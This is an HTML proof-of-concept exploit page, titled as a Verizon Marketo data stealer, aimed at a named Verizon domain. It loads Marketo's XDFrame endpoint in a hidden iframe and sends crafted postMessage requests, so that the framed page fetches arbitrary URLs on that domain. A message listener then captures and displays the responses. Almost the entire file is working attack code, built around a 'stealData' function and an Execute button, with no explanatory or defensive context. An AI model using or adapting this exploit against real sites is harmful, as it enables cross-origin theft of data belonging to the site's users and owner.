<!DOCTYPE html>
<html>
<head>
    <title>Verizon Marketo Data Stealer PoC</title>
    <style>
        body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; line-height: 1.4; }
        .container { border: 1px solid #0f0; padding: 20px; max-width: 800px; margin: auto; }
        #output { white-space: pre-wrap; word-break: break-all; margin-top: 20px; border: 1px dashed #0f0; padding: 10px; background: #000; height: 400px; overflow-y: auto; }
        .cmd { color: #ff0; }
        #status { font-weight: bold; color: #fff; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>[!] Verizon Full Response Proxy Exploit</h1>
        <p>Target: <code>info.business.solution.verizon.com</code></p>
        <div id="status">Status: Waiting for iframe...</div>
        
        <div>
            <strong>Target URL to Fetch:</strong> 
            <input type="text" id="target_url" value="/sitemap.xml" style="width: 300px; background: #333; color: #fff; border: 1px solid #0f0;">
            <button onclick="stealData()" style="background: #0f0; color: #000; border: none; cursor: pointer; padding: 2px 10px;">Execute</button>
        </div>

        <div id="output">Response data will be captured here...</div>
    </div>

    <iframe id="proxy_frame" 
            src="https://info.business.solution.verizon.com/index.php/form/XDFrame" 
            style="display:none;"></iframe>

    <script>
        var proxy = document.getElementById('proxy_frame');
        var output = document.getElementById('output');

        window.addEventListener("message", function(event) {
            if (event.origin !== "https://info.business.solution.verizon.com") return;

            try {
                var data = JSON.parse(event.data);
                if (data.mktoReady) {
                    document.getElementById('status').innerText = "Status: Proxy Ready.";
                }
                
                if (data.mktoResponse) {
                    document.getElementById('status').innerText = "Status: Data Recieved!";
                    output.innerText = "--- START CAPTURE ---\n" + 
                                     (typeof data.mktoResponse.data === 'object' ? 
                                      JSON.stringify(data.mktoResponse.data, null, 2) : 
                                      data.mktoResponse.data) + 
                                     "\n--- END CAPTURE ---";
                }
            } catch (e) {
                console.error("Parse error", e);
            }
        });

        function stealData() {
            var target = document.getElementById('target_url').value;
            document.getElementById('status').innerText = "Status: Fetching " + target + "...";
            var payload = {
                "mktoRequest": {
                    "id": Date.now(),
                    "ajaxParams": {
                        "url": target,
                        "dataType": "text" 
                    }
                }
            };
            proxy.contentWindow.postMessage(JSON.stringify(payload), "*");
        }
    </script>
</body>
</html>
